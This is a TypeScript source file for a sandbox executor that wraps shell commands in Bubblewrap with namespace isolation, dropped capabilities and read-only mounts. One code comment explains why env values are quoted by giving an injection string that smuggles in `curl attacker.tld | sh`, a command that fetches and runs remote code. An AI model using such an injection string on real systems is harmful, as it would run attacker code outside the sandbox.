/**
 * Linux Bubblewrap sandbox executor.
 *
 * Wraps shell commands with bwrap (Bubblewrap) to restrict process capabilities.
 * Uses --bind to mount scope paths read-write, --tmpfs for /tmp, and --ro-bind
 * for essential read-only system paths. Drops all capabilities via --cap-drop ALL
 * for defense-in-depth within the user namespace.
 */

import { type SpawnSyncOptions, spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { warn } from '../../utils/logger';
import {
	isValidEnvKey,
	SandboxError,
	type SandboxExecutor,
	type SandboxPolicyOptions,
} from '../executor';

/** Magic exit code bwrap returns when --version is passed */
const BWRAP_VERSION_EXIT = 0;

/**
 * Error codes from spawnSync that indicate bwrap is unavailable.
 */
const BWRAP_UNAVAILABLE_CODES = new Set(['ENOENT', 'EACCES', 'ENOSPC']);

/**
 * Base-OS location of bwrap on the common Linux distros (Debian/Ubuntu,
 * Fedora). Preferred over the bare name for the same class of reason as the
 * macOS sandbox-exec resolver (issue #2236 F6): resolving to an absolute
 * path forecloses PATH-shim ambiguity. bwrap's `--version` flag IS valid
 * (unlike sandbox-exec's), so only the binary resolution changes here — the
 * probe invocation and success criterion are unchanged.
 */
const BWRAP_ABSOLUTE = '/usr/bin/bwrap';

/**
 * Resolve the bwrap binary: absolute base-OS path when present, bare-name
 * (PATH resolution) fallback otherwise. Never throws.
 */
function resolveBwrapBinary(): string {
	try {
		if (existsSync(BWRAP_ABSOLUTE)) {
			return BWRAP_ABSOLUTE;
		}
	} catch {
		// fall through to bare-name fallback
	}
	return 'bwrap';
}

/**
 * Size in bytes for the /tmp tmpfs (500 MiB).
 * bwrap --size requires a plain non-zero decimal byte count; suffixes (M, MB)
 * are rejected with "--size takes a non-zero number of bytes" (issue #1997).
 */
const TMPFS_SIZE_BYTES = 524288000; // 500 * 1024 * 1024

/** Shell-quote a value for the shell STRING returned by `wrapCommand`. */
function shellQuote(s: string): string {
	return `'${shellEscape(s)}'`;
}

/** Inputs of {@link buildBwrapArgs}: everything a wrap varies by. */
interface BwrapArgsInput {
	/**
	 * Quotes each interpolated value: shell quoting for the shell string
	 * `wrapCommand` returns, identity for an argv passed straight to spawn.
	 */
	quote: (value: string) => string;
	/** Directory mounted as the size-capped tmpfs. */
	temp: string;
	/** Absolute paths bound read-only BEFORE the writable scopes. */
	readonlyRoots: readonly string[];
	/** Paths bound read-write. */
	scopes: readonly string[];
	/** Already-built `--setenv` / `--unsetenv` arguments. */
	envArgs: readonly string[];
	networkMode: SandboxPolicyOptions['network_mode'] | undefined;
	/** The shell command run as `bash -c <command>`. */
	command: string;
}

/**
 * The bwrap argument list of a wrap — the single source of truth for both
 * `wrapCommand` and the namespace smoke test, so the smoke test can never
 * exercise fewer kernel features or mounts than a real wrap needs.
 */
function buildBwrapArgs(input: BwrapArgsInput): string[] {
	const { quote } = input;
	// Read-only roots (the session workspace) go BEFORE the writable scope
	// binds: bwrap mounts in argument order, so the scope paths are mounted
	// on top and stay writable while everything else in the root is
	// readable but not writable.
	const roBindArgs = input.readonlyRoots.flatMap((p) => [
		'--ro-bind',
		quote(p),
		quote(p),
	]);
	// --bind SRC DEST for each scope path.
	const bindArgs = input.scopes.flatMap((p) => ['--bind', quote(p), quote(p)]);
	const args = [
		'--unshare-user',
		'--unshare-ipc',
		'--die-with-parent',
		'--new-session',
		'--cap-drop',
		'ALL',
		...roBindArgs,
		...bindArgs,
		'--dev',
		'/dev',
		'--size',
		String(TMPFS_SIZE_BYTES),
		'--tmpfs',
		quote(input.temp),
		'--ro-bind',
		'/etc',
		'/etc',
		'--ro-bind',
		'/usr',
		'/usr',
		'--ro-bind',
		'/lib',
		'/lib',
		'--ro-bind',
		'/lib64',
		'/lib64',
		'--proc',
		'/proc',
		'--unshare-pid',
		...input.envArgs,
		'--',
		'bash',
		'-c',
		quote(input.command),
	];
	if ((input.networkMode ?? 'off') === 'off') {
		args.splice(1, 0, '--unshare-net');
	}
	return args;
}

/**
 * Arguments for the namespace smoke test: a real wrap under the default
 * policy (network off, no scopes, no read-only roots, `/tmp` tmpfs) running
 * `true`, built by the same {@link buildBwrapArgs} as `wrapCommand`. It thus
 * needs every kernel feature and mount a real wrap needs (user, network, IPC
 * and PID namespaces, a new session, dropped capabilities, `/proc`, `/dev`,
 * a sized tmpfs, the `/etc` `/usr` `/lib` `/lib64` binds, and `bash`).
 * `bwrap --version` succeeds even where bwrap cannot create a namespace at
 * all — Ubuntu 24.04+ restricts unprivileged user namespaces
 * (`kernel.apparmor_restrict_unprivileged_userns = 1`) and every real
 * invocation fails with "setting up uid map: Permission denied"; unprivileged
 * containers can allow the user namespace but refuse `--proc`; a host
 * without `/lib64` fails the bind. Availability must therefore be proven by
 * running one.
 */
export const BWRAP_NAMESPACE_SMOKE_ARGS: readonly string[] = buildBwrapArgs({
	quote: (value) => value,
	temp: '/tmp',
	readonlyRoots: [],
	scopes: [],
	envArgs: [],
	networkMode: 'off',
	command: 'true',
});

/** Run the namespace smoke test; never throws. */
function probeBwrapNamespace(
	binary: string,
): { ok: true } | { ok: false; reason: string } {
	try {
		const result = spawnSync(binary, [...BWRAP_NAMESPACE_SMOKE_ARGS], {
			// AGENTS.md invariant 3: an explicit cwd, never the process cwd.
			cwd: tmpdir(),
			windowsHide: true,
			encoding: 'utf-8',
			timeout: 5000,
			stdio: ['ignore', 'ignore', 'pipe'],
		} satisfies SpawnSyncOptions);
		if (!result.error && result.status === 0) return { ok: true };
		const reason =
			result.error?.message ??
			(result.stderr?.trim().split('\n')[0] || `exit ${result.status}`);
		return { ok: false, reason };
	} catch (err: unknown) {
		return {
			ok: false,
			reason: err instanceof Error ? err.message : String(err),
		};
	}
}

/**
 * Check whether the bwrap binary is present on PATH.
 * Uses spawnSync to probe synchronously without throwing.
 * Logs specific error codes when bwrap is found but unusable.
 */
function probeBwrap(): boolean {
	try {
		const binary = _internals.resolveBwrapBinary();
		const result = spawnSync(binary, ['--version'], {
			cwd: tmpdir(),
			windowsHide: true,
			encoding: 'utf-8',
			timeout: 5000,
			stdio: ['ignore', 'pipe', 'ignore'],
		} satisfies SpawnSyncOptions);

		// Check for spawnSync-level errors (binary found but failed to run)
		if (result.error) {
			const code = (result.error as NodeJS.ErrnoException).code as
				| string
				| undefined;
			if (code && BWRAP_UNAVAILABLE_CODES.has(code)) {
				warn(
					`Sandbox disabled: bwrap error (${code}). Falling through to tool-layer enforcement.`,
				);
				return false;
			}
			// Other spawn errors (e.g., ENOMEM) — treat as unavailable
			warn(
				`Sandbox disabled: bwrap spawn error (${result.error.message}). Falling through to tool-layer enforcement.`,
			);
			return false;
		}

		if (
			result.status !== BWRAP_VERSION_EXIT ||
			result.stdout.trim().length === 0
		) {
			return false;
		}

		const smoke = _internals.probeBwrapNamespace(binary);
		if (!smoke.ok) {
			warn(
				`Sandbox disabled: bwrap cannot create a sandbox on this host (${smoke.reason}). ` +
					'Unprivileged user namespaces may be restricted (Ubuntu 24.04+: ' +
					'kernel.apparmor_restrict_unprivileged_userns=1). Falling through to tool-layer enforcement.',
			);
			return false;
		}
		return true;
	} catch (err: unknown) {
		// Unexpected exception — treat as unavailable
		const message = err instanceof Error ? err.message : String(err);
		warn(
			`Sandbox disabled: probe threw (${message}). Falling through to tool-layer enforcement.`,
		);
		return false;
	}
}

/**
 * DI seam for testability. Exposes probeBwrap so tests can simulate
 * ENOENT / EACCES / ENOSPC error conditions without requiring a real bwrap binary.
 * Internal calls use probeBwrap() directly; tests replace _internals.probeBwrap.
 */
export const _internals: {
	probeBwrap: typeof probeBwrap;
	probeBwrapNamespace: typeof probeBwrapNamespace;
	resolveBwrapBinary: typeof resolveBwrapBinary;
} = {
	probeBwrap,
	probeBwrapNamespace,
	resolveBwrapBinary,
} as const;

/**
 * Escape a string for safe embedding inside a single-quoted shell string.
 * Replaces single quotes with the four-character sequence: '\''
 */
function shellEscape(s: string): string {
	return s.replace(/'/g, "'\\''");
}

/**
 * Linux Bubblewrap sandbox executor.
 *
 * Instantiated with scope paths and an optional temp directory override.
 * wrapCommand() returns a bwrap-wrapped command string that:
 *   - bind-mounts each policy.readonly_roots path read-only (the session
 *     workspace), FIRST, so the command can read the project it is working in
 *   - bind-mounts each scope path read-write, after the read-only roots so a
 *     scope path inside the workspace is writable (bwrap mounts in argument
 *     order and a later bind sits on top of an earlier one; the reverse order
 *     would leave the scope path read-only)
 *   - mounts a tmpfs at /tmp (writable temporary storage)
 *   - bind-mounts essential system paths read-only
 *   - spawns the raw command via `bash -c '<command>'`
 */
export class BubblewrapSandboxExecutor implements SandboxExecutor {
	/** Human-readable mechanism identifier */
	public readonly mechanism = 'Bubblewrap';

	private readonly _scopePaths: string[];
	private readonly _tempDir: string | undefined;
	private _available: boolean;
	private _disabledReason: string | null;

	/**
	 * @param scopePaths - Absolute paths the sandboxed process may write to (default: empty array)
	 * @param tempDir   - Optional temp directory path (defaults to /tmp)
	 */
	constructor(scopePaths: string[] = [], tempDir?: string) {
		this._scopePaths = scopePaths;
		this._tempDir = tempDir;
		this._available = false;
		this._disabledReason = null;

		try {
			if (!_internals.probeBwrap()) {
				this._disabledReason = 'bwrap not available or not functional';
				warn(
					`Sandbox disabled: ${this._disabledReason}. Falling through to tool-layer enforcement.`,
				);
			} else {
				this._available = true;
			}
		} catch (err: unknown) {
			const message = err instanceof Error ? err.message : String(err);
			this._disabledReason = `constructor threw: ${message}`;
			this._available = false;
			warn(
				`Sandbox disabled: ${this._disabledReason}. Falling through to tool-layer enforcement.`,
			);
		}
	}

	/**
	 * Returns true when the bwrap binary is found on PATH and the sandbox
	 * has not been disabled.
	 */
	isAvailable(): boolean {
		return this._available;
	}

	/**
	 * Disable the sandbox with a reason. Allows external code to force
	 * fallback to unwrapped execution (e.g., for testing, explicit opt-out,
	 * or when initialization fails).
	 *
	 * After calling disable():
	 * - isAvailable() returns false
	 * - wrapCommand() returns the raw command unchanged (passthrough)
	 */
	disable(reason: string): void {
		this._available = false;
		this._disabledReason = reason;
		warn(
			`Sandbox disabled: ${reason}. Falling through to tool-layer enforcement.`,
		);
	}

	/**
	 * Wrap a shell command string with bwrap sandbox arguments.
	 *
	 * @param command   - Raw shell command to execute inside the sandbox
	 * @param scopePaths - Additional scope paths to bind (merged with constructor scope)
	 * @param tempDir   - Optional temp directory override
	 * @param envOverrides - Optional per-call env overrides: string sets the var, null unsets it.
	 *                      When omitted, no per-call env override is applied.
	 * @returns A bwrap-wrapped command string ready for shell execution,
	 *          or the raw command string when the sandbox is unavailable (passthrough mode)
	 */
	wrapCommand(
		command: string,
		scopePaths: string[],
		tempDir?: string,
		envOverrides?: Record<string, string | null>,
		policy?: Pick<SandboxPolicyOptions, 'network_mode' | 'readonly_roots'>,
	): string {
		// Re-check availability before each wrap — bwrap may become unavailable mid-session
		if (!this._available) {
			throw new SandboxError('Sandbox not available', 'SANDBOX_UNAVAILABLE');
		}

		const temp = tempDir ?? this._tempDir ?? '/tmp';
		const allScopes = [...this._scopePaths, ...scopePaths];

		// Only absolute read-only roots are accepted; a relative or empty
		// entry is dropped rather than mounted somewhere unintended.
		const readonlyRoots = [
			...new Set(
				(policy?.readonly_roots ?? []).filter(
					(p) => typeof p === 'string' && p.startsWith('/') && p !== '/',
				),
			),
		];

		// Build env override arguments for bwrap
		// --setenv KEY=VALUE for string values (two separate args), --unsetenv KEY for null values.
		// bwrap passes these directly to execve — values are NOT shell-interpreted.
		// Keys are validated upfront to prevent shell-injection.
		const envArgs: string[] = [];
		if (envOverrides) {
			for (const [key, value] of Object.entries(envOverrides)) {
				// Reject invalid env var names silently — they cannot be safely interpolated.
				if (!isValidEnvKey(key)) {
					continue;
				}
				if (value === null) {
					envArgs.push('--unsetenv', key);
				} else {
					// Use 3-arg form: --setenv KEY VALUE (three separate args).
					// bwrap parses the 3-arg form unambiguously; value may contain '='.
					//
					// The VALUE is single-quoted through `shellEscape` like every
					// other interpolated value here (scope paths :224-225, temp
					// :264, command :284). It is true that bwrap hands --setenv
					// values straight to execve without shell interpretation — but
					// that is not the layer that parses this. `wrapCommand` returns
					// `${binary} ${args.join(' ')}`, a SHELL STRING, and the outer
					// shell parses it first. An unquoted value containing
					// `'; curl attacker.tld | sh; echo '` would execute OUTSIDE the
					// sandbox. `key` needs no quoting: `isValidEnvKey` constrains it
					// to /^[a-zA-Z_][a-zA-Z0-9_]*$/, which is shell-inert.
					envArgs.push('--setenv', key, shellQuote(value));
				}
			}
		}

		const args = buildBwrapArgs({
			quote: shellQuote,
			temp,
			readonlyRoots,
			scopes: allScopes,
			envArgs,
			networkMode: policy?.network_mode,
			command,
		});

		const binary = _internals.resolveBwrapBinary();
		return `${binary} ${args.join(' ')}`;
	}

	/**
	 * Return environment variable overrides required for the bubblewrap sandbox.
	 *
	 * Security is achieved through bwrap CLI flags (--unshare-user, --unshare-net,
	 * --unshare-ipc, --die-with-parent, --new-session), not environment variables.
	 * bwrap ignores unknown environment variables.
	 */
	getEnvOverrides(): Record<string, string | null> {
		return {};
	}
}
